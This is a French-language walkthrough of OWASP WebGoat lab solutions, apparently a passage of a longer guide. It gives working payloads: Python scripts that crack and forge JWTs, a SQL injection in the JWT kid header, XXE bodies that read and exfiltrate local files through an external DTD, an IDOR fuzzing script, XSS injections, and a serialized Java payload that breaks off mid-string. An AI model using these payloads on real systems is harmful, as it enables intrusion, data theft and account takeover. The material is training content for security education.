     with open('google-10000-english-master/google-10000-english.txt', 'r') as fd:  
         lines = [line.rstrip('\n').encode() for line in fd]  
  
     def hmac_base64(key, message):  
         return base64.urlsafe_b64encode(bytes.fromhex(hmac.new(key, message, hashlib.sha256).hexdigest()))  
  
     for line in lines:  
         test = hmac_base64(line, unsigned_token)  
  
         if test == signature:  
             print('Key: {}'.format(line.decode()))  
             new_token = (token[0] + '.' + base64.urlsafe_b64encode(payload).decode().rstrip('=')).encode()  
             new_signature = hmac_base64(line, new_token)  
             new_token += ('.' + new_signature.decode().rstrip('=')).encode()  
             print('New token: {}'.format(new_token.decode()))  
             return  
  
jwt_tokens_5()
```

![JWT 5](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/jwt-5.png)

7.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Ce challenge ne donne pas assez d'informations pour être résolu. En fouillant dans le code source, on se rend compte qu'il faut faire une requête `POST` vers http://host:port/WebGoat/JWT/refresh/login, ayant pour en-tête `Content-Type: application/json` et pour corps `{"user":"Jerry","password":"bm5nhSkxCXZkKRy4"}` pour récupérer le token d'actualisation de Jerry.
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Le numéro de leçon ne devient pas vert après validation.

![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look at the access log you will find a token there  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The token from the access log is no longer valid, can you find a way to refresh it?  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The endpoint for refreshing a token is 'jwt/refresh/newToken'  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use the found access token in the Authorization: Bearer header and use your own refresh token

*   Récupérer le token d'accès de Tom dans les **logs**.
*   Faire une requête `POST` vers http://host:port/WebGoat/JWT/refresh/newToken , ayant pour en-tête `Content-Type: application/json` et `Authorization: Bearer <tom_access_token>` et pour corps `{"refresh_token":"<jerry_refresh_token>"}`
*   Récupérer le nouveau token d'accès de Tom. Get the `<tom_access_token_new>`.
*   Intercepter la requête vers http://host:port/WebGoat/JWT/refresh/checkout et ajouter l'en-tête `Authorization: Bearer <tom_new_access_token>`.

![JWT 7](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/jwt-7-1.png)

![JWT 7](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/jwt-7-2.png)

![JWT 7](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/jwt-7-3.png)

![JWT 7](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/jwt-7-4.png)

![JWT 7](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/jwt-7-5.png)

8.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Il manque une précision dans les indices, la clé est décodée comme une chaine en base64, aussi au lieu d'utiliser comme **kid** `hacked' UNION select 'deletingTom' from INFORMATION_SCHEMA.SYSTEM_USERS --`, il faut utiliser `hacked' UNION select 'ZGVsZXRpbmdUb20=' from INFORMATION_SCHEMA.SYSTEM_USERS --`.

![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Le numéro de leçon ne devient pas vert après validation.

![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Take a look at the token and specifically and the header  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The 'kid' (key ID) header parameter is a hint indicating which key was used to secure the JWS  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The key can be located on the filesystem in memory or even reside in the database  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The key is stored in the database and loaded while verifying a token  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Using a SQL injection you might be able to manipulate the key to something you know and create a new token.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use: hacked' UNION select 'deletingTom' from INFORMATION\_SCHEMA.SYSTEM\_USERS -- as the kid in the header and change the contents of the token to Tom and hit the endpoint with the new token

*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_.
*   Sur WebGoat, cliquer sur **Delete**.
*   Repérer la requête vers `delete` dans l'onglet _Réseau_ et cliquer sur _En-têtes_.
*   Remarquer le paramètre :
```
token=eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0.eyJpc3MiOi
JXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYX
VkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiSmVycn
kiLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0.CgZ27DzgVW8gzc0n6i
zOU638uUCi6UhiOJKYzoEZGE8
```
*   En base64, cela se décode en : 
```
{"typ":"JWT","kid":"webgoat_key","alg":"HS256"}.{"iss":"WebGoat Token Builder",
"iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com",
"username":"Jerry","Email":"jerry@webgoat.com","Role":["Cat"]}.signature
```
*   Modifier les deux premières parties du token en :
```
{"typ":"JWT","kid":"hacked' UNION select 'ZGVsZXRpbmdUb20=' from 
INFORMATION_SCHEMA.SYSTEM_USERS --","alg":"HS256"}
``` 
et 
```
{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,
"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Tom",
"Email":"jerry@webgoat.com","Role":["Cat"]}
```
puis recalculer la signature avec la clé `deletingTom`, avec le script Python ci-dessous par exemple.
*   Le nouveau token est :
```
eyJ0eXAiOiJKV1QiLCJraWQiOiJoYWNrZWQnIFVOSU9OIHNlbGVjdCAnWkdWc1pYUnBibWRVYjIwPScg
ZnJvbSBJTkZPUk1BVElPTl9TQ0hFTUEuU1lTVEVNX1VTRVJTIC0tIiwiYWxnIjoiSFMyNTYifQ.eyJpc
3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwN
CwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiV
G9tIiwiRW1haWwiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il19.JrDpQmNiVI818UvO
MQgRmPkZOetw7Ic1WbPvStS2B6U
```
*   Cliquer sur _Modifier et Renvoyer_, modifier le paramètre avec la nouvelle valeur générée, et renvoyer la requête.

```python
import base64  
import hashlib  
import hmac  
  
def jwt_tokens_8():  
     def hmac_base64(key, message):  
         return base64.urlsafe_b64encode(bytes.fromhex(hmac.new(key, message, hashlib.sha256).hexdigest()))  
  
     header = '{"typ":"JWT","kid":"hacked\' UNION select \'ZGVsZXRpbmdUb20=\' from INFORMATION_SCHEMA.SYSTEM_USERS --","alg":"HS256"}'.encode()  
     payload = '{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Tom","Email":"jerry@webgoat.com","Role":["Cat"]}'.encode()  
  
     new_token = (base64.urlsafe_b64encode(header).decode().rstrip('=') +  
         '.' +  
         base64.urlsafe_b64encode(payload).decode().rstrip('=')).encode()  
     new_signature = hmac_base64('deletingTom'.encode(), new_token)  
     new_token += ('.' + new_signature.decode().rstrip('=')).encode()  
  
     print('New token: {}'.format(new_token.decode()))  
     return  
  
jwt_tokens_8()
```

#### **(A3) Sensitive Data Exposure:**

##### Insecure Login

2.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Le numéro de leçon ne devient pas vert après validation.

*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_.
*   Sur WebGoat, cliquer sur **Log in**.
*   Repérer la requête vers `start.mvc` dans l'onglet _Réseau_ et cliquer sur _Paramètres_.
*   Remarquer les paramètres `{"username":"CaptainJack","password":"BlackPearl"}`.

#### **(A4) XML External Entities (XXE):**

##### XXE

3.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try submitting the form and see what happens  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use ZAP/Burp to intercept the request and try to include your own DTD  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try to include a doctype "(<!DOCTYPE...)" in the xml  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The include can be as follows: <!DOCTYPE user \[<!ENTITY root SYSTEM "file:///"> \]>  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Do not forget to reference the entity  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) In the comment you should references: <comment><text>&root;test</text></comment>

*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_.
*   Sur WebGoat, poster un commentaire.
*   Repérer la requête vers `simple` dans l'onglet _Réseau_ et cliquer sur _Modifier et renvoyer_.
*   Modifier le corps de la requête en : `<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>`.

![XXE 3](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/xxe-3.png)

4.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Take a look at the content type  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Does the endpoint only accept json messages?

*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_.
*   Sur WebGoat, poster un commentaire.
*   Repérer la requête vers `content-type` dans l'onglet _Réseau_ et cliquer sur _Modifier et renvoyer_.
*   Modifier le corps de la requête en : `<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>`, et modifier l'en-tête `Content-Type: application/json` en `Content-Type: application/xml`.

![XXE 4](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/xxe-4.png)

6. 
Même si ce n'est pas un challenge, une petite erreur s'est glissée dans la leçon, faire attention à rentrer les bonnes URL pour pouvoir effectuer le test. 
  
**attack.dtd**  
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!ENTITY ping SYSTEM 'http://host:port/landing?test=HelloWorld' >
```  
  
**Request Body**  
```xml
<?xml version="1.0"?>  
<!DOCTYPE root [  
<!ENTITY % remote SYSTEM "http://host:port/files/username/attack.dtd" >  
%remote;  
]>  
<comment>  
<text>test&ping;</text>  
</comment>  
```

7.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) This assignment is more complicated you need to upload the contents of a file to the attackers site (WebWolf in this case)  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) In this case you cannot combine external entities in combination with internal entities.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use parameter entities to perform the attack, see for example: https://www.acunetix.com/blog/articles/xml-external-entity-xxe-limitations/  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) An example DTD can be found here WebGoat/https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/example.dtd, include this DTD in the xml comment  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use for the comment, be aware to replace the url accordingly: <?xml version="1.0"?><!DOCTYPE comment \[<!ENTITY % remote SYSTEM "http://localhost:9090/files/test1234/test.dtd">%remote;\]><comment><text>test&send;</text></comment>

*   Envoyer le fichier **contents\_file.dtd** vers **WebWolf**.
*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_.
*   Sur WebGoat, poster un commentaire.
*   Repérer la requête vers `blind` dans l'onglet _Réseau_ et cliquer sur _Modifier et renvoyer_.
*   Modifier le corps de la requête comme spécifié ci-dessous.

**contents\_file.dtd**  
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!ENTITY % all "<!ENTITY send SYSTEM 'http://host:port/landing?%file;' >" >%all;
```  
  
**Request Body**  
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE xxe [  
<!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt" >  
<!ENTITY % dtd SYSTEM "http://host:port/files/username/contents_file.dtd" >  
%dtd;]>  
<comment>  
<text>test&send;</text>  
</comment>
```

![XXE 7](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/xxe-7.png)

#### **(A5) Broken Access Control:**

##### Insecure Direct Object References

2.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Log in first. User Name is tom, password is cat.

S'indentifier avec les identifiants fournis. Identify with the provided credentials.

3.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Le numéro de leçon ne devient pas vert après validation.

![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Make sure you have logged in on the previous step/page  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) View the response using developer tools or a proxy.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The attributes are not visible and have nothing to do with size, color or name

Les attributs attendus sont : **role**, **userID**.

4.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look at the previous request for profile, this is similar  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You will need data from the previous request for your own profile  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Append your id to the previous request (i.e. .../profile/{yourId})

*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_.
*   Dans la leçon 3, cliquer sur **View Profile**.
*   Repérer la requête vers `profile` dans l'onglet _Réseau_ et cliquer sur _Réponse_.
*   Remarque le paramètre **userID**, la réponse attendue est **WebGoat/IDOR/profile/userID\_value**.

![IDOR 4](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/idor-4.png)

5.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The default request here won't work at all, so you will need to manually craft the request or tamper it with a proxy  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You will likely need to 'fuzz' to try different values for the userId at the end of the Url  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try incrementing the id value. It's not a simple +1, but it's also not too far off  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) For editing the other user's profile, you will need to use the proxy or manually craft the request again  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) To edit the other user's profile, you will use the same Url you did to view the other user's profile  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) To edit, You will need to change the method, what is the RESTful method used for 'update' or 'edit'?  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You will also need the body of the request (will look something like the profile)  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The request should go to ... /WebGoat/IDOR/profile/{Buffalo Bills Id}  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Your payload should look something like ... {"role" : 1,"color" : "red","size" : "small","name" : "Tom Cat","userId" : "2342388"}

**View Another Profile**:  
Le script ci-dessous permet de _fuzzer_ l'URL trouvée dans l'exercice précédent pour trouver un autre profil. On en trouve un ayant pour **id** 2342388.

```python
import requests  
  
def idor_5():  
     index = 2342300  
  
     headers = {  
         'Cookie': COOKIE,  
     }  
  
     while True:  
         r = requests.get('http://192.168.99.100:8080/WebGoat/IDOR/profile/{}'.format(index), headers=headers)  
  
         if r.status_code != 500 and index != 2342384:  
             print("Index: {}".format(index))  
             return  
         index += 1  
  
idor_5()
```

**Edit Another Profile**:  
Envoyer une requête PUT vers http://192.168.99.100:8080/WebGoat/IDOR/profile/2342388 avec pour en-tête `Content-Type: application/json` et pour corps `{"role":1, "color":"red", "size":"large", "name":"Buffalo Bill", "userId":2342388}`

##### Missing Function Level Access Control

2.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You can inspect the DOM or review the source in the proxy request/response cycle.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look for indications of something that would not be available to a typical user  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look for something a super-user or administator might have available to them

*   Effectuer un clic-droit sur l'élément **Log Out**, et cliquer sur _Examiner l'élément_.
*   Juste en dessous dans le HTML, on trouve des champs cachés, dont les champs : **Users**, **Config**.

![MFLAC 2](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/mflac-2.png)

3.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) There is an easier way and a 'harder' way to achieve this, the easier way involves one simple change in a GET request.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) If you haven't found the hidden menus from the earlier exercise, go do that first.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) When you look at the users page, there is a hint that more info is viewable by a given role.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) For the easy way, have you tried tampering the GET request? Different content-types?  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) For the 'easy' way, modify the GET request to /users to include 'Content-Type: application/json'  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Now for the harder way ... it builds on the easier way'  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) If the request to view users, were a 'service' or 'RESTful' endpoint, what would be different about it?  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) If you're still looking for hints ... try changing the Content-type header as in the GET request.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You also need to deliver a proper payload for the request (look at how registration works). This should be formatted in line with the content-type you just defined.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You will want to add WEBGOAT\_ADMIN for the user's role. Yes, you'd have to guess/fuzz this in a real-world setting.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) OK, here it is. First, create an admin user ... Change the method to POST, change the content-type to "application/json". And your payload should look something like: {"username":"newUser2","password":"newUser12","matchingPassword":"newUser12","role":"WEBGOAT\_ADMIN"}  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Now log in as that user and bring up WebGoat/users. Copy your hash and log back in to your original account and input it there to get credit.

*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_.
*   Aller sur http://host:port/WebGoat/users.
*   Repérer la requête vers `users` dans l'onglet _Réseau_ et cliquer sur _Modifier et Renvoyer_.
*   Ajouter l'en-tête `Content-Type: application/json`.
*   Récupérer le _hash_ en réponse.

![MFLAC 3](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/mflac-3.png)

![MFLAC 3](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/mflac-3-2.png)

#### **(A7) Cross-Site Scripting (XSS):**

![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Dans le panneau à gauche, la _checkbox_ verte qui est censée apparait après complétion de l'ensemble des leçons d'un sujet n'apparait pour aucune des trois leçons.

##### Cross Site Scripting

2. 
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png) Les principaux navigateurs ont banni le Javascript de la barre d'URL, contrairement à ce que laisse penser la consigne. Ouvrir plutôt les _Outils de développements_, et l'onglet _Console_. 

La réponse attendue est `Yes`.

7.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Think about how the inputs are presumably processed by the application.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Quantity inputs are probably processed as integer values. Not the best option for inputting text right?  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) What information send to the application gets reflected back after being submitted?  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Just try purchasing something. You want your script to be included in the purchase-confirmation.

Entrer `<script>alert()</script>` dans la case **Enter your credit card number:**.

10.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) To search through the client side code, use the developer tools of your browser. (If you don't know how to use them, check the Developer Tools Lesson in the general category.)  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Since you are looking for application code, check the WebGoat/js/goatApp folder for a file that could handle the routes.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Make sure you add the base route at the start, when submitting your solution.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Still did not find it? Check the GoatRouter.js file. It should be pretty easy to determine.

*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Débogueur_.
*   Repérer le fichier `goatApp/View/GoatRouter.js` et l'ouvrir.
*   Recherchez le mot **routes** dans le fichier pour tomber sur `'test/:param': 'testRoute'`.
*   La réponse attendue est alors `start.mvc#test/`.

![XSS 10](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/xss-10.png)

11.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Open a new tab and navigate to the test-route you just figured out in the previous lesson.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Your url should look something like that http://localhost:8080/WebGoat/start.mvc#REPLACE-WITH-THE-TEST-ROUTE/some\_parameters  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Note how the parameters you send to the test-route get reflected back to the page. Now add your JavaScript to it.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You have to use script tags, so your JavaScript code gets executed when being rendered into the DOM.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Since you are working with an URL, you might have to URL-encode your parameters.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Replace '/' with '%2F' in your URL parameters.

*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Console_.
*   Naviguer vers l'URL [http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;](http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;).
*   Récupérer le numéro en sortie de la fonction.

![XSS 11](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/xss-11.png)

12.
**1. Are trusted websites immune to XSS attacks?**

Solution 4: No because the browser trusts the website if it is acknowledged trusted, then the browser does not know that the script is malicious.

**2. When do XSS attacks occur?**

Solution 3: The data is included in dynamic content that is sent to a web user without being validated for malicious content.

**3. What are Stored XSS attacks?**

Solution 1: The script is permanently stored on the server and the victim gets the malicious script when requesting information from the server.

**4. What are Reflected XSS attacks?**

Solution 2: They reflect the injected script off the web server. That occurs when input sent to the web server is part of the request.

**5\. Is JavaScript the only way to perform XSS attacks?**

Solution 4: No there are many other ways. Like HTML, Flash or any other type of code that the browser executes.

##### Cross Site Scripting (stored)

3.
*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Console_.
*   Poster `<script>webgoat.customjs.phoneHome()</script>` en commentaire.
*   Récupérer le numéro en sortie de la fonction.

![XSS Stored 3](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/xss-stored-3.png)

##### Cross Site Scripting (mitigation)

5.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You do not store the user input in this example. Try to encode the user's input right before you place it into the HTML document.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Make use of JavaServer Pages Standard Tag Library (JSTL) and JSP Expression Language.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Take a look at OWASP Java Encoder Project.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Do not forget to reference the tag libs and choose "e" as prefix.

*   La première ligne doit contenir : `<%@ taglib uri="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project" %>`
*   Remplacer `<%= request.getParameter("first_name")%>` par `${e:forHtml(param.first_name)}`.
*   Remplacer `<%= request.getParameter("last_name")%>` par `${e:forHtml(param.last_name)}`.

6.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try to have a look at the AntiSamy documentation.

Le code suivant permet de valider la leçon.

```java
import org.owasp.validator.html.*;  
import MyCommentDAO;  
  
public class AntiSamyController {  
     public void saveNewComment(int threadID, int userID, String newComment){  
         Policy p = Policy.getInstance("antisamy-slashdot.xml");  
         AntiSamy as = new AntiSamy();  
         CleanResults cr = as.scan(newComment, p, AntiSamy.DOM);  
         MyCommentDAO.addComment(threadID, userID, cr.getCleanHTML());  
     }  
}  
```

#### **(A8) Insecure Deserialization:**

##### Insecure Deserialization

5.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Je n'ai pas réussi à valider la leçon, ci-dessous, quelques pistes de recherche.

*   Le package à utiliser pour déclencher la faille serait Hibernate 5.
*   Le payload suivant, trouvé dans un [module](https://github.com/federicodotta/Java-Deserialization-Scanner/blob/master/src/burp/BurpExtender.java) de Burp Suite fonctionne, mais déclenche un _sleep_ de 10 secondes.
*   La [bibliothèque ysoserial](https://github.com/frohoff/ysoserial) semble être une piste de recherche aussi.

```
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9
sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHV
lh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGp
hdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9An
XEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHR
